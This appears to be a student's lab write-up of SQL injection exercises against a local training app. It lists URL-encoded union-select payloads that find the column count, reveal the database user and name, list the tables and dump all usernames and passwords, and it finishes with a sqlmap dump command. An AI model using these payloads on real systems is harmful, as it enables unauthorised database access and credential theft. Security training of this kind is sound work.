# 9.1-SQLi Review

### 1.  Display the Login name and password for arbitrary user

`http://localhost:8090/Less-1?id=1`

<img width="1308" height="442" alt="image" src="https://github.com/user-attachments/assets/07c69dfd-254a-465b-951f-c7358012e60e" />

### 2.  Error condition when number of columns are exceeded

`http://localhost:8090/Less-1?id=-1%27%20union%20select%201,2,3--+`

<img width="1420" height="441" alt="image" src="https://github.com/user-attachments/assets/0597f0bc-12fc-4ecc-ba4c-7da9fc13f319" />

`http://localhost:8090/Less-1?id=-1%27%20union%20select%201,2,3,4--+`

<img width="1920" height="433" alt="image" src="https://github.com/user-attachments/assets/ddab7d3a-563c-4b36-a76f-a46879dca812" />

### 3.  A Union select that displays your own value for login name and password

`http://localhost:8090/Less-1?id=-1%27%20union%20select%201,%22charlotte%22,%22password%22--+`

<img width="1500" height="380" alt="image" src="https://github.com/user-attachments/assets/8bbfcd65-c1fa-4868-bc99-03ac713def22" />

### 4.  Another union that displays the mysql user and database

`http://localhost:8090/Less-1?id=-1%27%20union%20select%201,user(),database()--+`

<img width="1478" height="390" alt="image" src="https://github.com/user-attachments/assets/ef5622c9-479c-4eeb-86ce-29511e19b699" />

### 5.  A union that dumps all the tables in the current database

`http://localhost:8090/Less-1?id=-1%27%20union%20select%201,group_concat(table_name%20separator%20%27,%20%27),3%20from%20information_schema.tables%20where%20table_schema=database()--%20+`

<img width="1920" height="397" alt="image" src="https://github.com/user-attachments/assets/0095c576-125c-4e64-b941-d7ff8cf88b14" />

### 6.  A union that dumps all the usernames and passwords

`http://localhost:8090/Less-1?id=-1%27%20union%20select%201,group_concat(username,%27:%27,password%20separator%20%27,%20%27),3%20from%20users--%20+`

<img width="1920" height="430" alt="image" src="https://github.com/user-attachments/assets/7b0f6eac-1153-427a-91cd-4048f41629c7" />

### 7.  Figure out how to run sqlmap against the vulnerable uri:  http://127.0.0.1:8090/Less-1?id=1
●    Run this using Medium Difficulty and Intermediate Enumeration.
●    Figure out how to dump the contents of the users table in the security database.
●    Provide a screenshot showing the results of dumping the user's table.

`sqlmap -u "http://127.0.0.1:8090/Less-1?id=1" -dump`

<img width="361" height="430" alt="image" src="https://github.com/user-attachments/assets/31957277-9a29-4185-9d3c-db6af2c79374" />
